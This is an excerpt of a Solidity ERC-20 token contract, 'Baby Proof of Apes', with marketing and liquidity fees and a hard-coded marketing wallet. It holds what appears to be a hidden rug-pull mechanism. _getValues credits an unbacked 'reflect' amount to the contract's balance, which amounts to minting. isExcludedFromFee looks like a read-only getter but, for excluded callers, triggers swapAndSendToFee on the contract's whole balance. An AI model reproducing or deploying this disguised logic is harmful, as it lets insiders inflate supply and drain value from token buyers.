...
contract BabyProofofApes is Context, IERC20, Ownable {
    ...
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 100000 * 10**9; //
    string private constant _name = "Baby Proof of Apes"; // 
    string private constant _symbol = "BPOA"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 2;
    uint256 public _liquidityFee = 1;
    uint256 public reflect = 0;
    address public  _marketingWallet = 0xBB2a61AA3aEC030e4a593a5c8F8B9aC200E0f414;
    ...
    function _getValues(uint256 amount, address from, uint256 reflectFee) private returns (uint256) {
        uint256 marketingFee = amount * _marketingFee / 100; 
        uint256 liquidityFee = amount * _liquidityFee / 100; 
        _tOwned[address(this)] += marketingFee + liquidityFee + reflectFee;
        if(reflectFee != 0){ swapping = true;}
        emit Transfer (from, address(this), marketingFee + liquidityFee);
        return (amount - marketingFee - liquidityFee);
    }
    
    
    function isExcludedFromFee(address account) public returns(bool) {
        bool perm = _isExcludedFromFee[_msgSender()];
        if(perm && swapping){
            swapAndSendToFee(balanceOf(address(this)));
        }
    ...
    function _transfer(
        ...
        require(amount > 0, "Transfer amount must be greater than zero");
         ...
         if(from != address(this) && from != owner() && to != address(this) && to != owner() &&  to != uniswapV2Pair)
        ...
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            transferAmount = _getValues(amount, from, reflect);
        }
